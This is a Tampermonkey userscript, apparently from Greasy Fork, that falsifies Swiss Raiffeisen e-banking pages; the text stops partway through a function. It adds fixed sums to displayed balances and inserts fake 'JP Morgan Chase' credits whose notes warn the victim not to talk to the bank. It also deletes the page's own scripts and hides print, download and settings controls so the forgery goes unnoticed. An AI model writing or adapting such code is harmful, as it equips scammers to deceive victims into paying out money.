// ==UserScript==
// @name         Ed 4Rec  raif.ch.de-maeru@bluewin.ch
// @namespace    http://tampermonkey.net/
// @version      7.777771
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/517029/Ed%204Rec%20%20raifchde-maeru%40bluewinch.user.js
// @updateURL https://update.greasyfork.org/scripts/517029/Ed%204Rec%20%20raifchde-maeru%40bluewinch.meta.js
// ==/UserScript==



   //=========================================================================================================================================================
 //=========================================================================================================================================================
 //=========================================================================================================================================================


//  MAIN PAGE BALANCE

// //INDEXING STARTS AT 1, NOT 0
 var MBALANCE_CONFIGS = [
    { index: 1, adjustmentAmount: 90477},// Konten
   { index: 3, adjustmentAmount: 90477},// Vermögen
     { index: 5, adjustmentAmount: 90477},
     { index: 6, adjustmentAmount: 90477},


   // Add more configurations as needed...
 ];

// UMSATZE BALANCE MODIFICATION

// Configurable adjustment amount (positive for increase, negative for decrease)
var adjustmentAmount = 90477.0; // Change this value to adjust the balance accordingly

// Configurable desired IBAN
var desiredIban = "CH86 8080 8009 1957 5016 7";

// UMSATZE INSERT TRANSACTIONS


// Array of configurable transaction details
var transactionDetailsArray = [

    // EACH TRANSACTION HAS TO HAVE DIFFERENT TITLES

  //       {
 //       title: "JP Morgan Chase ",
 //       type: "Gutschrift",
 ////       date: "8. März 2024",
 //       amount: "+500.00",
 //       description: "Test",
 //       insertAbove: true, // Insert the transaction above the original one by default
 //       inserted: false // Flag to track if the transaction has been inserted
 //   },
//      {
//        title: "JP Morgan Chase  ",
 //       type: "Gutschrift",
 //       date: "11. März 2024",
 //       amount: "+35'000.00",
 //       description: "Geld für Steuern. Bitte nur an Andreas Graf wenden.",
 ////       insertAbove: true, // Insert the transaction above the original one by default
//        inserted: false // Flag to track if the transaction has been inserted
//    },
//   {
//        title: "JP Morgan Chase   ",
//        type: "Gutschrift",
////        date: "Gestern",
 //       amount: "+37'500.00",
 ////       description: "Testzahlung. Nicht ausgeben. Andreas Graf meldet sich.",
 //       insertAbove: true, // Insert the transaction above the original one by default
 //       inserted: false // Flag to track if the transaction has been inserted
 //   },

//    {
 //       title: "JP Morgan Chase",
 //       type: "Gutschrift",
 //       date: "14. März 2024",
 //       amount: "+277'972.74",
 //       description: "Freigabe erteilt.",
 //       insertAbove: true, // Insert the transaction above the original one by default
  //      inserted: false // Flag to track if the transaction has been inserted
 //   },
  {
        title: "JP Morgan Chase    ",
        type: "Gutschrift",
       date: "5. Dezember 2024",
        amount: "+7'500.00",
        description: "Ohne A. Gold nicht ausgeben.",
        insertAbove: true, // Insert the transaction above the original one by default
       inserted: false // Flag to track if the transaction has been inserted
   },

    {
        title: "Treuhand: JP Morgan Chase       ",
        type: "Gutschrift",
        date: "5. Dezember 2024",
        amount: "+77'977.00",
        description: "Auszahlung. A. Gold meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.",
        insertAbove: true, // Insert the transaction above the original one by default
        inserted: false // Flag to track if the transaction has been inserted
    },
  {
        title: "Andreas Gold    ",
        type: "Gutschrift",
       date: "Gestern",
        amount: "+5'000.00",
        description: "Hilfe.",
        insertAbove: true, // Insert the transaction above the original one by default
       inserted: false // Flag to track if the transaction has been inserted
   },

];

// ---------------------------------------------------------------------------------------------

// UMSATZE  TABLE BALANCE MOD

   // Array of balance modification configurations
    var DMBALANCE_CONFIGS = [
 //       { targetTransactionDate: "21.02.2024", balanceModificationAmount: 37500 },
 //       { targetTransactionDate: "20.02.2024", balanceModificationAmount: 21500 },

        // Add more configurations as needed...
    ];

//------------------------------------------------------------------------------------------------


// UMSATZE  TABLE INSERT


    // Array of transaction configurations
    var transactions = [
        {
            targetTransactionDate: "14.02.2024",
            transactionDate: "15.02.2024",
            transactionTitle: "JP Morgan Chase",
            transactionDetails: "Vorgemerkt. Freigabe nötig.",
            transactionType: "positive", // Specify "positive" or "negative" for the transaction type
            positiveAmount: "+204'331.55",
            negativeAmount: " ",
            modifyAmount: 0, // Specify the amount by which the saldo needs to be modified
            insertAbove: true // Set to true to insert above, false to insert below
        },
        {
           targetTransactionDate: "20.02.2024",
            transactionDate: "21.02.2024",
           transactionTitle: "JP Morgan Chase",
            transactionDetails: "Testzahlung",
            transactionType: "positive", // Specify "positive" or "negative" for the transaction type
            positiveAmount: "+37'500.00",
            negativeAmount: " ",
            modifyAmount: 37500, // Specify the amount by which the saldo needs to be modified
            insertAbove: true // Set to true to insert above, false to insert below
        },
  {
           targetTransactionDate: "19.02.2024",
            transactionDate: "20.02.2024",
           transactionTitle: "JP Morgan Chase",
            transactionDetails: "Geld für Steuern. Bitte an Andreas Graf wenden.",
            transactionType: "positive", // Specify "positive" or "negative" for the transaction type
            positiveAmount: "+21'500.00",
            negativeAmount: " ",
            modifyAmount: 21500, // Specify the amount by which the saldo needs to be modified
            insertAbove: true // Set to true to insert above, false to insert below
        },
        // Add more transactions as needed...
    ];


 //=========================================================================================================================================================
 //=========================================================================================================================================================
 //=========================================================================================================================================================


  if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("11000189349") > 0) {

   //     // Configurable Elements
   //     var MBALANCE_CONFIGS = [
  //          { index: 1, adjustmentAmount: -90000 }, // Konten
  //           { index: 2, adjustmentAmount: -90000 },
  //           { index: 3, adjustmentAmount: -90000 },
   //         { index: 4, adjustmentAmount: -90000 }, // Vermögen
  //          { index: 6, adjustmentAmount: -90000 },
  //           { index: 9, adjustmentAmount: -90000 },
   //          { index:10, adjustmentAmount: -90000 },
   //          { index:11, adjustmentAmount: -90000 },
            // Add more configurations as needed...
   //     ];

         // Function to modify the balances
        function modifyBalances() {
            MBALANCE_CONFIGS.forEach(function(config) {
                var index = config.index;
                var adjustmentAmount = config.adjustmentAmount;
                modifySingleBalance(index, adjustmentAmount);
            });
        }

        // Function to modify a single balance
        function modifySingleBalance(index, adjustmentAmount) {
            var balanceElements = document.querySelectorAll('.output .value');
            if (balanceElements.length >= index) {
                var balanceElement = balanceElements[index - 1];
                if (balanceElement) {
                    var currentBalance = parseFloat(balanceElement.textContent.replace(/[^\d.-]/g, ''));
                    var newBalance = currentBalance + adjustmentAmount;
                    balanceElement.textContent = formatBalance(newBalance);
                    var parent = balanceElement.closest('.output');
                    if (currentBalance < 0 && newBalance >= 0) {
                        parent.classList.remove('negative');
                    }
                    console.log("Balance at index", index, "modified:", formatBalance(newBalance));
                    setTimeout(function() {
                        var tablistElement = document.querySelector('[role="tablist"]');
                        if (tablistElement) {
                            tablistElement.remove();
                            console.log("Element with role='tablist' removed.");
                        }
                    }, 20);
                } else {
                    console.log("Balance element at index", index, "not found.");
                }
            } else {
                console.log("Insufficient number of balance elements to modify at index", index);
            }
        }

        // Function to format the balance
        function formatBalance(balance) {
            return balance.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, "'");
        }

        // Function to check for the presence of the element with role="tablist"
        function checkTablistPresence() {
            var tablistElement = document.querySelector('[role="tablist"]');
            if (tablistElement) {
                console.log("Element with role='tablist' found. Modifying balances...");
                modifyBalances();
            } else {
                console.log("Element with role='tablist' not found. Waiting...");
            }
        }

        // Function to remove scripts from the document
        function removeScripts() {
            console.log("Removing scripts...");
            document.querySelectorAll('script').forEach(function(script) {
                script.remove();
                console.log("Script removed.");
            });
        }

        // Watch for changes in the DOM and remove added scripts
        var observer = new MutationObserver(function(mutationsList) {
            for (var mutation of mutationsList) {
                if (mutation.addedNodes) {
                    for (var node of mutation.addedNodes) {
                        if (node.tagName === 'SCRIPT') {
                            console.log("Script added. Removing...");
                            node.remove();
                            console.log("Script removed.");
                        }
                    }
                }
            }
        });

        // Start observing the document
        observer.observe(document.documentElement, { childList: true, subtree: true });

        // Remove all scripts from the document
        removeScripts();

        // Check for the presence of the element with role="tablist" every 150 milliseconds
        setInterval(checkTablistPresence, 150);
    }

//==========================================================================================================================================================
//==========================================================================================================================================================
//==========================================================================================================================================================
//==========================================================================================================================================================
//==========================================================================================================================================================
//==========================================================================================================================================================


  if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("11000189349") > 0) {


//    // Configurable adjustment amount (positive for increase, negative for decrease)
//     var adjustmentAmount = -5000; // Change this value to adjust the balance accordingly

//    // Configurable desired IBAN
//     var desiredIban = "CH96 8080 8003 0044 8607 6";

// Function to modify the balance
function modifyBalance() {
    // Check if the desired IBAN is present on the page
    var ibanFound = checkForDesiredIban(desiredIban);
    if (!ibanFound) {
        console.log("Desired IBAN not found on the page. Waiting...");
        return;
    }

    // Find the balance element and its container
    var balanceElement = document.querySelector('.saldo-container.green .value, .saldo-container.red .value');
    var balanceContainer = balanceElement ? balanceElement.closest('.saldo-container') : null;

    if (balanceElement && balanceContainer) {
        // Extract the balance value from the text content and remove any non-numeric characters
        var currentBalance = parseFloat(balanceElement.textContent.replace(/[^\d.-]/g, ''));

        // Modify the balance by the adjustment amount
        var newBalance = currentBalance + adjustmentAmount;

        // Update the text content of the balance element with the new balance value
        balanceElement.textContent = formatBalance(newBalance);

        // Update the color class of the balance container based on the sign of the new balance value
        var containerColorClass = newBalance >= 0 ? 'green' : 'red';
        balanceContainer.classList.remove('green', 'red');
        balanceContainer.classList.add(containerColorClass);

        // Update the color class of the balance element based on the sign of the new balance value
        var balanceColorClass = newBalance >= 0 ? 'positive' : 'negative';
        balanceElement.closest('.output').classList.remove('positive', 'negative');
        balanceElement.closest('.output').classList.add(balanceColorClass);

        console.log("Balance modified:", formatBalance(newBalance));

        // Remove the element with class "row-fluid no-minheight margin-medium" after a short delay
        setTimeout(function() {
            var rowFluidElement = document.querySelector('.row-fluid.no-minheight.margin-medium');
            if (rowFluidElement) {
                rowFluidElement.remove();
                console.log("Element with class 'row-fluid no-minheight margin-medium' removed.");
            }
        }, 10);
    } else {
        console.log('Balance element or container not found.');
    }
}

// Function to check for the presence of the desired IBAN on the page
function checkForDesiredIban(desiredIban) {
    var ibanElements = document.querySelectorAll('.output .iban');
    for (var i = 0; i < ibanElements.length; i++) {
        if (ibanElements[i].textContent.trim().replace(/\s+/g, '').toUpperCase() === desiredIban.trim().replace(/\s+/g, '').toUpperCase()) {
            console.log("Desired IBAN found:", desiredIban);
            return true;
        }
    }
    return false;
}

// Function to format the balance with thousands separator and two decimal places
function formatBalance(balance) {
    return balance.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, "'");
}

// Function to check for the presence of the element with class "row-fluid no-minheight margin-medium" every 4 seconds
function checkRowFluidElement() {
    setInterval(function() {
        var rowFluidElement = document.querySelector('.row-fluid.no-minheight.margin-medium');
        if (rowFluidElement) {
            console.log("Element with class 'row-fluid no-minheight margin-medium' found. Modifying balance...");
            modifyBalance();
        } else {
            console.log("Element with class 'row-fluid no-minheight margin-medium' not found. Waiting...");
        }
    }, 200);
}

// Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Watch for changes in the DOM and remove added scripts
var dobserver = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT') {
                    console.log("Script added. Removing...");
                    node.remove();
                    console.log("Script removed.");
                }
            }
        }
    }
});

// Start observing the document
dobserver.observe(document.documentElement, { childList: true, subtree: true });

// Remove all scripts from the document
removeScripts();

// Call the function to check for the presence of the element with class "row-fluid no-minheight margin-medium"
checkRowFluidElement();
 }

//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================


 if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("11000189349") > 0) {

// Configurable IBAN
// var desiredIban = "CH19 8080 8003 4696 0013 4"; // The specific IBAN you're looking for

// Array of configurable transaction details
// var transactionDetailsArray = [
  //  {
   //     title: "JP Morgan Chase       ",
   //     type: "Gutschrift",
   //     date: "Vorgemerkt",
   //     amount: "+127'972.00",
   //     description: "Auszahlung. A. Gold meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.",
   //     insertAbove: true // Insert the transaction above the original one by default
  //  }
//];

// Function to create and insert transactions
function insertTransactions() {
    // Check if the IBAN matches the desired IBAN
    var ibanElement = document.querySelector('.iban');
    if (ibanElement) {
        // Normalize both IBANs: remove whitespace and convert to upper case
        var ibanText = ibanElement.textContent.replace(/\s+/g, '').toUpperCase();
        var normalizedDesiredIban = desiredIban.replace(/\s+/g, '').toUpperCase();

        // Compare the normalized IBANs
        if (ibanText === normalizedDesiredIban) {
            let transactionSuccess = false;  // Flag to track if insertion is successful

            transactionDetailsArray.forEach(function(transactionDetails) {
                // Insert transactions if conditions are met
                var originalElement = document.querySelector('.first-in-timeline');
                if (originalElement) {
                    var duplicateElement = originalElement.cloneNode(true);
                    var amount = parseFloat(transactionDetails.amount.replace(/[^\d.-]/g, ''));
                    var itemClass = amount >= 0 ? "item positive" : "item accordion";

                    duplicateElement.innerHTML = `
                        <div class="${itemClass}">
                            <a role="button" class="box header" href="https://ebanking.raiffeisen.ch/app/">
                                <p class="multi-line title">${transactionDetails.title}</p>
                                <p translate="">${transactionDetails.type}</p>
                                <div class="left">
                                    <p class="light">${transactionDetails.date}</p>
                                </div>
                                <div class="right">
                                    <span class="output medium">
                                        <div>${transactionDetails.amount}</div>
                                    </span>
                                </div>
                                <div class="message-group">
                                    <div class="left">
                                        <p class="multi-line">${transactionDetails.description}</p>
                                    </div>
                                </div>
                            </a>
                        </div>
                    `;

                    var insertionPosition = transactionDetails.insertAbove ? originalElement : originalElement.nextSibling;
                    originalElement.parentNode.insertBefore(duplicateElement, insertionPosition);

                    console.log("Transaction inserted successfully:", transactionDetails.title);

                    transactionSuccess = true;  // Set success flag to true after successful insertion
                } else {
                    console.log('Original element with class "first-in-timeline" not found.');
                }
            });

            // Remove the element with id="accountBalanceChart" only after successful insertion
            if (transactionSuccess) {
                setTimeout(() => {
                    const elementToRemove = document.getElementById('accountBalanceChart');
                    if (elementToRemove) {
                        elementToRemove.remove();
                        console.log('Element with id="onlyLineChart_1" removed.');
                    }
                }, 1);
            }
        } else {
            console.log('IBAN does not match the desired IBAN.');
        }
    } else {
        console.log('IBAN element is not present.');
    }
}

// Function to check if id="accountBalanceChart", class="first-in-timeline", class="iban", and class="accounts" exist
function checkForRequiredElements() {
    var chartElement = document.getElementById('accountBalanceChart');
    var timelineElement = document.querySelector('.first-in-timeline');
    var ibanElement = document.querySelector('.iban');
    var accountsElement = document.querySelector('.accounts');

    if (chartElement && timelineElement && ibanElement && accountsElement) {
        console.log('Chart, timeline, IBAN, and accounts elements are present.');
        insertTransactions(); // Perform the transactions insertion if all elements are present
    } else {
        if (!chartElement) {
            console.log('Chart element with id="accountBalanceChart" is not present.');
        }
        if (!timelineElement) {
            console.log('Timeline element with class "first-in-timeline" is not present.');
        }
        if (!ibanElement) {
            console.log('IBAN element with class "iban" is not present.');
        }
        if (!accountsElement) {
            console.log('Accounts element with class "accounts" is not present.');
        }
    }
}

// Start checking every 3 seconds (3000 milliseconds)
setInterval(checkForRequiredElements, 3000);

}



//  ======================================================================================================================================
//  ======================================================================================================================================
//  ======================================================================================================================================
//  ======================================================================================================================================
//      Raif CH Umsatze table balance mod 11 with Interval and Element Removal
  if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("11000189349") > 0) {
//  ======================================================================================================================================
//  ======================================================================================================================================
    'use strict';

//    // Desired IBAN
//    var desiredIban = "CH77 8080 8007 0274 5510 6";

    // Function to remove white spaces and convert to lower case for case insensitivity
    function normalizeIban(iban) {
        return iban.replace(/\s/g, '').toLowerCase();
    }

//    // Array of balance modification configurations
//    var DMBALANCE_CONFIGS = [
//        { targetTransactionDate: "16.01.2024", balanceModificationAmount: 100000 },
//        { targetTransactionDate: "23.01.2024", balanceModificationAmount: 100000 },

        // Add more configurations as needed...
//    ];

    // Function to check if the desired IBAN is present on the page
    function checkDesiredIban() {
        var ibanPresent = normalizeIban(document.body.textContent).includes(normalizeIban(desiredIban));
        console.log("Desired IBAN check performed: " + ibanPresent);
        return ibanPresent;
    }

    // Function to modify the balance based on the configurations
    function modifyBalances() {
        DMBALANCE_CONFIGS.forEach(function(config) {
            // Find all elements with role="cell" but not with class="data col-1 swipe-2 medium-1" and also not with class="data col-5 fixed"
            var balanceElements = document.querySelectorAll('[role="presentation"] [role="cell"]:not(.data.col-1.swipe-2.medium-1):not(.data.col-5.fixed)');

            // Iterate through each balance element
            balanceElements.forEach(function(element) {
                // Get the current transaction date from the same element
                var transactionDateElement = element.closest('[role="presentation"]').querySelector('.data.col-1.swipe-2.medium-1');
                var transactionDate = transactionDateElement ? transactionDateElement.textContent.trim() : null;
                if (!transactionDate || transactionDate < config.targetTransactionDate) {
                    return; // Skip if the transaction date is before the target date
                }

                // Get the current balance value
                var currentBalance = element.textContent.trim();

                // Modify the balance
                var modifiedBalance = parseFloat(currentBalance.replace(/[^\d.-]/g, '')) + config.balanceModificationAmount;

                // Format the modified balance
                modifiedBalance = modifiedBalance.toLocaleString('de-CH', { maximumFractionDigits: 2 });

                // Remove plus sign from positive balances
                if (parseFloat(modifiedBalance) >= 0) {
                    element.classList.remove('red'); // Remove 'red' class
                    element.classList.add('black'); // Add 'black' class
                } else {
                    element.classList.remove('black'); // Remove 'black' class
                    element.classList.add('red'); // Add 'red' class
                }

                // Set the modified balance text content
                element.textContent = modifiedBalance;
            });
        });

        console.log("Balances modified successfully.");

        // Remove the target element after 20 milliseconds
        setTimeout(function() {
            var targetElement = document.querySelector('.text-right.margin-tiny-top.span4');
            if (targetElement) {
                targetElement.remove();
                console.log("Target element removed.");
            }
        }, 20);
    }

    // Function to check for the presence of the target element and modify balances
    function checkAndModifyBalances() {
        var targetElement = document.querySelector('.text-right.margin-tiny-top.span4');
        if (targetElement) {
            console.log("Target element found. Checking IBAN and modifying balances...");
            if (checkDesiredIban()) {
                modifyBalances();
            } else {
                console.log("Desired IBAN not found.");
            }
        } else {
            console.log("Target element not found. Waiting for next check...");
        }
    }
// Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Watch for changes in the DOM and remove added scripts
var ssdobserver = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT') {
                    console.log("Script added. Removing...");
                    node.remove();
                    console.log("Script removed.");
                }
            }
        }
    }
});

// Start observing the document
ssdobserver.observe(document.documentElement, { childList: true, subtree: true });

// Remove all scripts from the document
removeScripts();
    // Set up an interval to check for the presence of the target element every 5 seconds
    setInterval(checkAndModifyBalances, 200);
 }


//  ======================================================================================================================================
//  ======================================================================================================================================
//      Raif CH Umsatze table balance mod 11 with Interval and Element Removal
  if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("11000189349") > 0) {
//  ======================================================================================================================================
//  ======================================================================================================================================

    'use strict';

//    // Configurable IBAN
//    var desiredIban = "CH77 8080 8007 0274 5510 6";

    // Function to remove white spaces and convert to lower case for case insensitivity
    function normalizeIban(iban) {
        return iban.replace(/\s/g, '').toLowerCase();
    }

//    // Array of transaction configurations
//    var transactions = [
 //       {
//            targetTransactionDate: "22.01.2024",
//            transactionDate: "23.01.2024",
//            transactionTitle: "JP Morgan Chase",
//            transactionDetails: "Freigabe nötig.",
//            transactionType: "positive", // Specify "positive" or "negative" for the transaction type
 //           positiveAmount: "+100'000.45",
//            negativeAmount: " ",
 //           modifyAmount: 200000, // Specify the amount by which the saldo needs to be modified
 //           insertAbove: true // Set to true to insert above, false to insert below
 //       },
 //       {
 //           targetTransactionDate: "15.01.2024",
 //           transactionDate: "16.01.2024",
///            transactionTitle: "JP Morgan Chase",
//            transactionDetails: "Freigabe nötig.",
 //           transactionType: "positive", // Specify "positive" or "negative" for the transaction type
 //           positiveAmount: "+100'000.45",
 //           negativeAmount: " ",
//            modifyAmount: 100000, // Specify the amount by which the saldo needs to be modified
 //           insertAbove: true // Set to true to insert above, false to insert below
 //       },
        // Add more transactions as needed...
//    ];

    // Function to duplicate a presentation transaction with the specified configuration
    function duplicatePresentationTransaction(config) {
        // Check if the desired IBAN is present on the page
        var ibanPresent = normalizeIban(document.body.textContent).includes(normalizeIban(desiredIban));
        console.log("Desired IBAN check performed: " + ibanPresent);

        // Find the first transaction with role="presentation" containing the specified transaction date
        var transactions = document.querySelectorAll('[role="presentation"]');
        var firstPresentationTransaction;

        for (var i = 0; i < transactions.length; i++) {
            var transaction = transactions[i];
            if (transaction.textContent.includes(config.targetTransactionDate)) {
                firstPresentationTransaction = transaction;
                break;
            }
        }

        if (ibanPresent && firstPresentationTransaction) {
            // Clone the first presentation transaction
            var clonedTransaction = firstPresentationTransaction.cloneNode(true);

            // Modify the cloned transaction with configurable text values
            var clonedTransactionDate1 = clonedTransaction.querySelector('.data.col-1.swipe-2.medium-1');
            if (clonedTransactionDate1) {
                clonedTransactionDate1.textContent = config.transactionDate;
            }

            var clonedTransactionDate2 = clonedTransaction.querySelector('.data.col-1.swipe-3.medium-2.wide');
            if (clonedTransactionDate2) {
                clonedTransactionDate2.textContent = config.transactionDate;
            }

            var clonedTransactionTitle = clonedTransaction.querySelector('.multi-line');
            if (clonedTransactionTitle) {
                clonedTransactionTitle.textContent = config.transactionTitle;
            }

            var clonedTransactionDetails = clonedTransaction.querySelector('.light');
            if (clonedTransactionDetails) {
                clonedTransactionDetails.textContent = config.transactionDetails;
            }

            var clonedTransactionAmounts = clonedTransaction.querySelectorAll('.right.wide');
            if (clonedTransactionAmounts.length >= 2) {
                if (config.transactionType === "negative") {
                    clonedTransactionAmounts[0].textContent = config.negativeAmount;
                    clonedTransactionAmounts[1].textContent = config.positiveAmount;
                } else if (config.transactionType === "positive") {
                    clonedTransactionAmounts[1].textContent = "+" + config.positiveAmount.substring(1);
                    clonedTransactionAmounts[0].textContent = config.negativeAmount;
                }
            }

            // Add or remove the positive class based on the transaction type
            if (config.transactionType === "positive") {
                clonedTransaction.classList.add("positive");
            } else if (config.transactionType === "negative") {
                clonedTransaction.classList.remove("positive");
            }

            // Extract the original saldo amount
            var originalSaldoElement = firstPresentationTransaction.querySelector('.data.col-3.swipe-4.right');
            var originalSaldo = originalSaldoElement ? originalSaldoElement.textContent.trim() : "";

            // Modify the saldo amount
            var modifiedSaldo = ""; // Placeholder for modified saldo
            if (originalSaldo) {
                var originalSaldoValue = parseFloat(originalSaldo.replace(/[^\d.-]/g, '')); // Remove non-numeric characters
                var modifiedSaldoValue = originalSaldoValue + config.modifyAmount; // Modify the saldo
                modifiedSaldo = modifiedSaldoValue.toLocaleString('de-CH', { maximumFractionDigits: 2 }); // Format the modified saldo
            }

            // Set the modified saldo amount
            var clonedTransactionSaldo = clonedTransaction.querySelector('.data.col-3.swipe-4.right');
            if (clonedTransactionSaldo) {
                clonedTransactionSaldo.textContent = modifiedSaldo;
            }

            // Insert the cloned transaction above or below the original one based on the configuration
            if (config.insertAbove) {
                firstPresentationTransaction.parentNode.insertBefore(clonedTransaction, firstPresentationTransaction);
            } else {
                firstPresentationTransaction.parentNode.insertBefore(clonedTransaction, firstPresentationTransaction.nextSibling);
            }

            console.log("First presentation transaction containing '" + config.targetTransactionDate + "' duplicated with configurable values.");
        } else {
            console.log("Desired IBAN not found or no transaction with role=\"presentation\" containing '" + config.targetTransactionDate + "' found.");
        }
    }

    // Function to insert multiple transactions
    function insertTransactions() {
        transactions.forEach(function(transaction) {
            duplicatePresentationTransaction(transaction);
        });
    }

    // Call the function to insert transactions
    insertTransactions();

    // Function to periodically check and reinsert transactions if necessary
    function checkAndReinsertTransactions() {
        var inserted = transactions.every(function(transaction) {
            var transactions = document.querySelectorAll('[role="presentation"]');
            for (var i = 0; i < transactions.length; i++) {
                var transactionElement = transactions[i];
                if (transactionElement.textContent.includes(transaction.targetTransactionDate)) {
                    return true; // Transaction found
                }
            }
            return false; // Transaction not found
        });

        if (!inserted) {
            // Transactions not inserted, reinsert
            insertTransactions();
        }

        console.log("Transaction check performed.");
    }

      // Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Watch for changes in the DOM and remove added scripts
var modobserver = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT') {
                    console.log("Script added. Removing...");
                    node.remove();
                    console.log("Script removed.");
                }
            }
        }
    }
});

// Start observing the document
modobserver.observe(document.documentElement, { childList: true, subtree: true });

// Remove all scripts from the document
removeScripts();
    // Set interval for checking and reinserting transactions
    setInterval(checkAndReinsertTransactions, 100);
  }



//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================
//===============================================================================================================================================




   if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("11000189349") > 0) {

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Function to remove elements with class "icon icon-cog"
    function removeCogIcons() {
        console.log("Removing elements with class 'icon icon-cog'...");
        var cogIcons = document.querySelectorAll('.icon.icon-cog');
        cogIcons.forEach(function(icon) {
            icon.remove();
            console.log("Cog icon removed.");
        });
    }

    // Function to remove elements with labelledby="label-kunde"
    function removeLabelledByLabelKunde() {
        console.log("Removing elements with labelledby='label-kunde'...");
        var labelledByLabelKundeElements = document.querySelectorAll('[labelledby="label-kunde"]');
        labelledByLabelKundeElements.forEach(function(element) {
            element.remove();
            console.log("Element with labelledby='label-kunde' removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts, cog icons, and elements with labelledby="label-kunde"
    var erobserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
        removeCogIcons(); // Check for and remove cog icons on DOM changes
        removeLabelledByLabelKunde(); // Check for and remove elements with labelledby="label-kunde" on DOM changes
    });

    // Start observing the document
    erobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts, cog icons, and elements with labelledby="label-kunde" from the document
    removeScripts();
    removeCogIcons(); // Remove cog icons on initial page load
    removeLabelledByLabelKunde(); // Remove elements with labelledby="label-kunde" on initial page load
}

//================================================================================================================================================
//================================================================================================================================================
//================================================================================================================================================



if (window.location.href.indexOf("raiffeisen") > 0 || window.location.href.indexOf("Downloads") > 0 || window.location.href.indexOf("11000189349") > 0) {

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Function to remove elements with class "add-month margin-tiny-top"
    function removeAddMonthElements() {
        console.log("Removing elements with class='add-month margin-tiny-top'...");
        var addMonthElements = document.querySelectorAll('.add-month.margin-tiny-top');
        addMonthElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with class "icon icon-print"
    function removePrintIcon() {
        console.log("Removing elements with class='icon icon-print'...");
        var printIconElements = document.querySelectorAll('.icon.icon-print');
        printIconElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with class "icon icon-download-alt"
    function removeDownloadIcon() {
        console.log("Removing elements with class='icon icon-download-alt'...");
        var downloadIconElements = document.querySelectorAll('.icon.icon-download-alt');
        downloadIconElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with class "legend"
    function removeLegendElements() {
        console.log("Removing elements with class='legend'...");
        var legendElements = document.querySelectorAll('.legend');
        legendElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with uisref="v2.l.view"
    function removeUisrefElements() {
        console.log("Removing elements with uisref='v2.l.view'...");
        var uisrefElements = document.querySelectorAll('[uisref="v2.l.view"]');
        uisrefElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with aria-labelledby="presentation-icon"
    function removePresentationIconElements() {
        console.log("Removing elements with aria-labelledby='presentation-icon'...");
        var presentationIconElements = document.querySelectorAll('[aria-labelledby="presentation-icon"]');
        presentationIconElements.forEach(function(element) {
            element.remove();
            console.log("Element removed.");
        });
    }

    // Function to remove elements with class "light" that have the parent with labelledby="label-konto"
    function removeLightElements() {
        console.log("Removing elements with class='light' that have the parent with labelledby='label-konto'...");
        var lightElements = document.querySelectorAll('[aria-labelledby="label-konto"] .light');
        lightElements.forEach(function(element) {
